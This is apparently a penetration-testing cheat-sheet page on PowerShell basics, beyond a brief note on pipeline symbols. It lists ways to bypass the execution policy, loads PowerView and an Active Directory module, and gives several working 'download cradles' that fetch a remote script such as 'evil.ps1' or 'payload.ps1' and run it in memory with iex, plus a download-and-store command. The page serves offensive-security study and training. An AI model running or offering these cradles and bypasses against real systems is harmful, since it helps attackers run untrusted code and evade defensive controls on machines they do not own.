# PowerShell Basics

### Useful Symbols

```
%	Foreach-Object
?	Where-Object
$_      The variable for the current value in the pipe line

Examples
1,2,3 | %{ write-host $_ } will print 1,2,3
1,2,3 | ?{$_ -gt 1} will print 2,3
```

### Execution Policy

Several ways to bypass

```batch
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass" 
```

### Load PowerShell script

```powershell
. c:\AD\Tools\PowerView.ps1
```

### Import a module

```powershell
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### List available module commands

```powershell
Get-Command -Module <module_name>
Get-Help <module_name>
```

### Download files

```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```

more options

{% code overflow="wrap" %}
```powershell
# Internet Explorer Downoad cradle
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response


$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()


$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
```
{% endcode %}

PowerShell v3+

```powershell
iex (iwr 'http://192.168.230.1/evil.ps1')
```

Download and store

```powershell
iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')
```
